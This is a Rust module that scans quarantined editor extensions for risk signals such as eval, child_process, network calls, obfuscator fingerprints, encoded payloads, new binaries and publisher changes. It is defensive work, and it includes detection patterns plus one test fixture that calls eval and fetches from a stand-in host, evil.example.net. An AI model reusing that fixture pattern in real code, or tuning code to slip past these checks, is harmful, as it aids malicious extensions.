//! Static security report for an extension package (design:
//! docs/rust-rewrite/MCP_DESIGN.md §6).
//!
//! Every gallery install or update is extracted into a quarantine folder first;
//! this module inspects it and produces findings. It detects *signals*, it does
//! not prove an extension is safe, and the report says so.

use std::collections::BTreeSet;
use std::path::Path;

use serde::Serialize;
use serde_json::Value;

/// Files scanned for code signals larger than this are skipped (still counted).
const MAX_SCANNED_FILE: u64 = 8 * 1024 * 1024;
const MAX_DOMAINS: usize = 40;

#[derive(Serialize, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
}

#[derive(Serialize, Clone, Debug)]
pub struct Finding {
    pub severity: Severity,
    pub title: String,
    pub detail: String,
}

#[derive(Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct Capabilities {
    pub child_process: Vec<String>,
    pub dynamic_code: Vec<String>,
    pub network: Vec<String>,
    pub native_binaries: Vec<String>,
    pub scripts: Vec<String>,
    pub obfuscated: Vec<String>,
    pub encoded_data: Vec<String>,
}

#[derive(Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct Publisher {
    pub namespace: String,
    pub verified: Option<bool>,
    pub published_by: Option<String>,
    pub version_timestamp: Option<String>,
    pub download_count: Option<u64>,
}

#[derive(Serialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct VersionDiff {
    pub previous_version: String,
    pub added_files: usize,
    pub removed_files: usize,
    pub new_native_binaries: Vec<String>,
    pub new_domains: Vec<String>,
    pub new_capabilities: Vec<String>,
    pub publisher_changed: bool,
}

#[derive(Serialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct AuditReport {
    pub id: String,
    pub version: String,
    pub display_name: Option<String>,
    pub source_url: String,
    pub sha256: String,
    pub package_size: u64,
    pub file_count: usize,
    pub main: Option<String>,
    pub browser: Option<String>,
    pub activation_events: Vec<String>,
    pub publisher: Publisher,
    pub capabilities: Capabilities,
    pub domains: Vec<String>,
    pub diff: Option<VersionDiff>,
    pub findings: Vec<Finding>,
    pub risk: Severity,
    pub disclaimer: &'static str,
}

/// Per-file facts used for the report and for diffs between versions.
#[derive(Default)]
struct Scan {
    files: BTreeSet<String>,
    capabilities: Capabilities,
    domains: BTreeSet<String>,
    /// Files that are obfuscated (or carry encoded payloads) and also evaluate
    /// code and use the network.
    suspicious_files: Vec<String>,
}

fn rel(root: &Path, path: &Path) -> String {
    path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/")
}

fn scan_folder(root: &Path) -> Scan {
    let mut scan = Scan::default();
    for entry in ignore::WalkBuilder::new(root).standard_filters(false).build().flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let name = rel(root, path);
        scan.files.insert(name.clone());
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("").to_ascii_lowercase();
        match ext.as_str() {
            "node" | "exe" | "dll" | "so" | "dylib" | "bin" => scan.capabilities.native_binaries.push(name.clone()),
            "sh" | "ps1" | "bat" | "cmd" | "vbs" => scan.capabilities.scripts.push(name.clone()),
            _ => {}
        }
        if !matches!(ext.as_str(), "js" | "mjs" | "cjs") {
            continue;
        }
        if entry.metadata().map(|m| m.len() > MAX_SCANNED_FILE).unwrap_or(true) {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(path) else { continue };
        scan_code(&name, &text, &mut scan);
    }
    scan
}

fn scan_code(name: &str, text: &str, scan: &mut Scan) {
    let has = |needle: &str| text.contains(needle);
    if has("child_process") {
        scan.capabilities.child_process.push(name.to_string());
    }
    if has("eval(") || has("new Function(") || has("require(\"vm\")") || has("require('vm')") || has("from \"vm\"") || has("from 'vm'") {
        scan.capabilities.dynamic_code.push(name.to_string());
    }
    if has("require(\"https\")") || has("require('https')") || has("require(\"http\")") || has("require('http')") || has("fetch(") || has("WebSocket") || has("require(\"net\")") || has("require('net')") {
        scan.capabilities.network.push(name.to_string());
    }
    // Obfuscation: fingerprints of obfuscators, not mere minification (bundled
    // extensions are routinely minified into very long lines).
    //  - javascript-obfuscator style identifiers (`_0x1a2b`) in large numbers;
    //  - dense `\xNN` escapes;
    //  - very long base64/hex-looking string literals (encoded payloads).
    let obfuscator_ids = text
        .match_indices("_0x")
        .filter(|(i, _)| text[i + 3..].chars().take(4).filter(|c| c.is_ascii_hexdigit()).count() == 4)
        .count();
    // Escaped Unicode tables (e.g. in language servers) produce one escape every
    // ~100 characters; obfuscators produce one every few characters.
    let hex_escapes = text.matches("\\x").count();
    let escape_dense = text.len() > 10_000 && hex_escapes * 20 > text.len();
    let obfuscated = obfuscator_ids > 200 || escape_dense;
    if obfuscated {
        scan.capabilities.obfuscated.push(name.to_string());
    }
    // Long base64/hex-looking literals: embedded binaries or payloads (reported
    // separately: legitimate libraries embed small binaries too).
    let long_encoded = text
        .split(['"', '\''])
        .any(|s| s.len() > 1_000 && s.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'='));
    if long_encoded {
        scan.capabilities.encoded_data.push(name.to_string());
    }
    // The malware pattern only counts when it is in one file: obfuscated code
    // that both evaluates code and talks to the network.
    let dynamic = scan.capabilities.dynamic_code.last().is_some_and(|f| f == name);
    let network = scan.capabilities.network.last().is_some_and(|f| f == name);
    if (obfuscated || long_encoded) && dynamic && network {
        scan.suspicious_files.push(name.to_string());
    }
    for (i, _) in text.match_indices("://") {
        let scheme_start = text[..i].rfind(|c: char| !c.is_ascii_alphabetic()).map(|p| p + 1).unwrap_or(0);
        let scheme = &text[scheme_start..i];
        if !matches!(scheme, "http" | "https" | "ws" | "wss") {
            continue;
        }
        let host: String = text[i + 3..]
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '.' || *c == '-')
            .collect::<String>()
            .to_ascii_lowercase();
        if host.contains('.') && host.len() > 3 && !host.ends_with('.') && scan.domains.len() < 500 {
            scan.domains.insert(host);
        }
    }
}

/// Well-known hosts that are noise in reports (docs, schemas, licenses).
fn is_benign_domain(host: &str) -> bool {
    const BENIGN: [&str; 14] = [
        "www.w3.org", "json-schema.org", "github.com", "raw.githubusercontent.com", "www.apache.org",
        "opensource.org", "code.visualstudio.com", "aka.ms", "go.microsoft.com", "npmjs.org",
        "www.npmjs.com", "nodejs.org", "developer.mozilla.org", "open-vsx.org",
    ];
    BENIGN.contains(&host) || host.ends_with(".example.com") || host == "example.com" || host == "localhost"
}

fn manifest(root: &Path) -> Result<Value, String> {
    let text = std::fs::read_to_string(root.join("package.json")).map_err(|e| format!("no package.json: {e}"))?;
    serde_json::from_str(&text).map_err(|e| format!("invalid package.json: {e}"))
}

fn fetch_publisher(namespace: &str, name: &str, version: &str) -> Publisher {
    let mut publisher = Publisher { namespace: namespace.to_string(), ..Default::default() };
    let url = format!("https://open-vsx.org/api/{namespace}/{name}/{version}");
    let Ok(response) = ureq::get(&url).header("User-Agent", "code-rs").call() else { return publisher };
    let Ok(text) = response.into_body().read_to_string() else { return publisher };
    let Ok(json) = serde_json::from_str::<Value>(&text) else { return publisher };
    publisher.verified = json.get("verified").and_then(Value::as_bool);
    publisher.published_by = json.pointer("/publishedBy/loginName").and_then(Value::as_str).map(str::to_string);
    publisher.version_timestamp = json.get("timestamp").and_then(Value::as_str).map(str::to_string);
    publisher.download_count = json.get("downloadCount").and_then(Value::as_u64);
    publisher
}

fn days_since(timestamp: &str) -> Option<i64> {
    // ISO-8601 "YYYY-MM-DDT..." -> days since then (good enough for "published minutes/days ago").
    let date = timestamp.get(..10)?;
    let mut parts = date.split('-').map(|p| p.parse::<i64>().ok());
    let (y, m, d) = (parts.next()??, parts.next()??, parts.next()??);
    // Days from civil (Howard Hinnant).
    let to_days = |y: i64, m: i64, d: i64| {
        let y = if m <= 2 { y - 1 } else { y };
        let era = y.div_euclid(400);
        let yoe = y - era * 400;
        let doy = (153 * (m + if m > 2 { -3 } else { 9 }) + 2) / 5 + d - 1;
        let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
        era * 146_097 + doe - 719_468
    };
    let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).ok()?.as_secs() as i64 / 86_400;
    Some(now - to_days(y, m, d))
}

fn push(findings: &mut Vec<Finding>, severity: Severity, title: &str, detail: String) {
    findings.push(Finding { severity, title: title.to_string(), detail });
}

fn sample(list: &[String]) -> String {
    let shown: Vec<&str> = list.iter().take(5).map(String::as_str).collect();
    let more = list.len().saturating_sub(shown.len());
    if more > 0 { format!("{} (+{more} more)", shown.join(", ")) } else { shown.join(", ") }
}

/// Builds the report for an extracted extension in `root`. `previous` is the
/// folder of the currently installed version, if any.
pub fn audit(root: &Path, previous: Option<&Path>, source_url: &str, sha256: &str, package_size: u64) -> Result<AuditReport, String> {
    let manifest = manifest(root)?;
    let get = |k: &str| manifest.get(k).and_then(Value::as_str).map(str::to_string);
    let namespace = get("publisher").unwrap_or_default();
    let name = get("name").unwrap_or_default();
    let version = get("version").unwrap_or_default();
    let activation_events: Vec<String> = manifest
        .get("activationEvents")
        .and_then(Value::as_array)
        .map(|a| a.iter().filter_map(Value::as_str).map(str::to_string).collect())
        .unwrap_or_default();

    let scan = scan_folder(root);
    let domains: Vec<String> = scan.domains.iter().filter(|d| !is_benign_domain(d)).take(MAX_DOMAINS).cloned().collect();
    let publisher = fetch_publisher(&namespace, &name, &version);
    let caps = &scan.capabilities;
    let mut findings = Vec::new();

    // Publisher / provenance.
    match publisher.verified {
        Some(true) => push(&mut findings, Severity::Info, "Verified publisher", format!("'{namespace}' is verified on Open VSX.")),
        Some(false) => push(&mut findings, Severity::Low, "Publisher not verified", format!("'{namespace}' is not verified on Open VSX: anyone could have claimed this namespace.")),
        None => push(&mut findings, Severity::Low, "Publisher unknown", "Could not query Open VSX for publisher details.".into()),
    }
    if let Some(days) = publisher.version_timestamp.as_deref().and_then(days_since) {
        if days < 2 {
            push(&mut findings, Severity::Medium, "Very recent version", format!("This version was published {days} day(s) ago. Malicious updates are often caught within days; consider waiting."));
        }
    }
    if let Some(count) = publisher.download_count {
        if count < 1_000 {
            push(&mut findings, Severity::Low, "Few downloads", format!("{count} downloads on Open VSX."));
        }
    }

    // Code signals.
    if !caps.native_binaries.is_empty() {
        push(&mut findings, Severity::Medium, "Native binaries", format!("Contains compiled code that cannot be inspected: {}", sample(&caps.native_binaries)));
    }
    if !caps.scripts.is_empty() {
        push(&mut findings, Severity::Low, "Shell scripts", format!("Contains scripts (common for activating environments or running tools): {}", sample(&caps.scripts)));
    }
    if !caps.child_process.is_empty() {
        push(&mut findings, Severity::Low, "Runs other programs", format!("Uses child_process (common for language tools, linters, formatters): {}", sample(&caps.child_process)));
    }
    if !caps.dynamic_code.is_empty() {
        push(&mut findings, Severity::Medium, "Dynamic code", format!("Uses eval / new Function / vm: {}", sample(&caps.dynamic_code)));
    }
    if !caps.obfuscated.is_empty() {
        push(&mut findings, Severity::Medium, "Possible obfuscation", format!("Obfuscator fingerprints (_0x identifiers, dense \\x escapes or long encoded strings), beyond normal minification: {}", sample(&caps.obfuscated)));
    }
    if !caps.network.is_empty() {
        push(&mut findings, Severity::Low, "Network access", format!("Makes network requests: {}", sample(&caps.network)));
    }
    if activation_events.iter().any(|e| e == "*") {
        push(&mut findings, Severity::Low, "Always active", "activationEvents contains '*': the extension starts with every window.".into());
    }
    if !caps.encoded_data.is_empty() {
        push(&mut findings, Severity::Medium, "Embedded encoded data", format!("Long base64/hex strings, possibly an embedded binary or payload (some libraries embed small helpers legitimately): {}", sample(&caps.encoded_data)));
    }
    if !scan.suspicious_files.is_empty() {
        push(&mut findings, Severity::High, "Suspicious combination", format!("Obfuscated or encoded code that also evaluates code and uses the network, in the same file (a common malware pattern): {}", sample(&scan.suspicious_files)));
    }

    // Diff with the installed version.
    let diff = previous.and_then(|prev| {
        let prev_manifest = self::manifest(prev).ok()?;
        let prev_scan = scan_folder(prev);
        let prev_publisher = prev_manifest.get("publisher").and_then(Value::as_str).unwrap_or_default().to_string();
        let new_bins: Vec<String> = caps.native_binaries.iter().filter(|b| !prev_scan.capabilities.native_binaries.contains(b)).cloned().collect();
        let new_domains: Vec<String> = domains.iter().filter(|d| !prev_scan.domains.contains(*d)).cloned().collect();
        let mut new_caps = Vec::new();
        for (label, now, before) in [
            ("runs other programs", &caps.child_process, &prev_scan.capabilities.child_process),
            ("dynamic code", &caps.dynamic_code, &prev_scan.capabilities.dynamic_code),
            ("network access", &caps.network, &prev_scan.capabilities.network),
            ("obfuscation", &caps.obfuscated, &prev_scan.capabilities.obfuscated),
        ] {
            if !now.is_empty() && before.is_empty() {
                new_caps.push(label.to_string());
            }
        }
        Some(VersionDiff {
            previous_version: prev_manifest.get("version").and_then(Value::as_str).unwrap_or("?").to_string(),
            added_files: scan.files.difference(&prev_scan.files).count(),
            removed_files: prev_scan.files.difference(&scan.files).count(),
            new_native_binaries: new_bins,
            new_domains,
            new_capabilities: new_caps,
            publisher_changed: prev_publisher != namespace,
        })
    });
    if let Some(d) = &diff {
        if d.publisher_changed {
            push(&mut findings, Severity::High, "Publisher changed", format!("The update comes from a different publisher than version {}.", d.previous_version));
        }
        if !d.new_native_binaries.is_empty() {
            push(&mut findings, Severity::High, "New native binaries in update", sample(&d.new_native_binaries));
        }
        if !d.new_capabilities.is_empty() {
            push(&mut findings, Severity::Medium, "New capabilities in update", d.new_capabilities.join(", "));
        }
        if !d.new_domains.is_empty() {
            push(&mut findings, Severity::Medium, "New domains in update", sample(&d.new_domains));
        }
    }

    let risk = findings.iter().map(|f| f.severity).max().unwrap_or(Severity::Info);
    let risk = if risk == Severity::Info { Severity::Low } else { risk };
    Ok(AuditReport {
        id: format!("{namespace}.{name}"),
        version,
        display_name: get("displayName"),
        source_url: source_url.to_string(),
        sha256: sha256.to_string(),
        package_size,
        file_count: scan.files.len(),
        main: get("main"),
        browser: get("browser"),
        activation_events,
        publisher,
        capabilities: scan.capabilities,
        domains,
        diff,
        findings,
        risk,
        disclaimer: "Static analysis finds signals, not proof: a low risk is not a guarantee that an extension is safe.",
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_code_signals_and_domains() {
        let mut scan = Scan::default();
        scan_code("a.js", "const cp = require('child_process'); eval(x); fetch('https://evil.example.net/p')", &mut scan);
        assert_eq!(scan.capabilities.child_process, vec!["a.js"]);
        assert_eq!(scan.capabilities.dynamic_code, vec!["a.js"]);
        assert_eq!(scan.capabilities.network, vec!["a.js"]);
        assert!(scan.domains.contains("evil.example.net"));
    }

    #[test]
    fn minified_code_is_not_obfuscation_but_obfuscator_output_is() {
        let mut scan = Scan::default();
        let minified = format!("!function(e){{{}}}()", "var a=1;".repeat(5_000));
        scan_code("min.js", &minified, &mut scan);
        assert!(scan.capabilities.obfuscated.is_empty());
        let obfuscated: String = (0..300).map(|i| format!("var _0x{:04x}=_0x{:04x}+1;", i, i + 1)).collect();
        scan_code("obf.js", &obfuscated, &mut scan);
        assert_eq!(scan.capabilities.obfuscated, vec!["obf.js"]);
    }

    #[test]
    fn days_since_parses_iso_dates() {
        assert!(days_since("2000-01-01T00:00:00Z").unwrap() > 9000);
    }

    #[test]
    fn benign_domains_are_filtered() {
        assert!(is_benign_domain("www.w3.org"));
        assert!(!is_benign_domain("evil.example.net"));
    }
}
